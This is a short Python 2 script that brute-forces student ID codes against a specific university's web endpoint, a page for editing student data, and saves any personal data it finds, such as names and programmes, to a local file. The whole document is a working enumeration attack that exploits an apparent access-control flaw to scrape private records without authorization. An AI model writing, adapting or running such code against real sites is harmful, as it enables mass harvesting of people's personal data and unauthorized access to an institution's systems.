import requests as rq
import time
from bs4 import BeautifulSoup as bs
import json


#leonek = 1026267038
url = "http://aulanet.umb.edu.co/aulanet_jh/edita_datos/editar_datos.php?codigo="
line = open("estudiantes.txt", "wb")
notname = "nomalumno = ''"
notcar = "carralumno = ''"

    
for i in range(97,98):
    for o in range(9,10):
        for j in range(27,28):
            for p in range(681,10000000):
                numero =str(i)+str(o).zfill(2)+str(j).zfill(2)+str(p).zfill(6)
                
                r = rq.get(url+numero)
                texto = bs(r.content, "html.parser")
                datos = texto.find("script",{"type":""} ).string
                datos = str(datos)
                
                if datos !="None":
                    print "Encontre algo con codigo %s \n %s"%(numero,datos)
                    line.write(datos+"\n----------------------------------------\n")
                    break
                    
                else:
                    print "Nada con codigo "+str(numero)
            